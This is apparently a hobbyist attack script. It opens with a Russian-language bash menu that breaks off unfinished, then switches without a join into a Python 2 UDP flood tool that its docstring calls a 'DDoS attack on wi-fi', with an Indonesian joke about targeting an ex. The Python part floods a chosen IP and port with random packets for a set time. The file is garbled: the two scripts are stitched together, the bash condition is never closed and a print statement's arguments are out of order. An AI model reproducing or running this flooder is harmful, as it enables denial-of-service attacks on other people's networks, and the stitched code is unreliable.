#!/bin/bash
clear
echo "		🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"
echo "		🔥 кто ты? Я Дима!  🔥"
echo "		🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"
echo "		🔥     1. Термукс   🔥"
echo "		🔥     2. Линукс    🔥"
echo "		🔥     3. Ерунда    🔥"
echo "		🔥                  🔥"
echo "		🔥   Введите 1/2/3: 🔥"
echo "		🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"
read numb
if [ $numb = "1" ]

"""Ддос атака на вай-фай
Tool untuk melakukan pengiriman packet kepada mantan terindah :'v """
import time
import socket
import random
import sys

def usage():
    print "Command: " + sys.argv[0] + " <ip> <port> <packet>"

def flood(victim, vport, duration):
    
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

